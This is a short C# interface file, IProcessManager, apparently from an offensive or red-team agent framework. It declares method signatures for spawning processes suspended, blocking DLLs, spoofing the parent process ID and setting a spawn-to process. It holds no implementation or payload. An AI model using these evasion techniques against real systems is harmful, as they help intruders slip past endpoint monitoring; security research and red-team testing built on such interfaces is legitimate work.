using PhantomInterop.Classes.Core;
using PhantomInterop.Structs.PhantomStructs;

namespace PhantomInterop.Interfaces
{
    public interface IProcessManager
    {
        Process NewProcess(string lpApplication, string lpArguments, bool startSuspended = false);
        bool BlockDLLs(bool status);
        bool SetPPID(int pid);
        bool SetSpawnTo(string lpApplication, string lpCommandLine = null, bool x64 = true);
        ApplicationStartupInfo GetStartupInfo(bool x64 = true);
    }
}
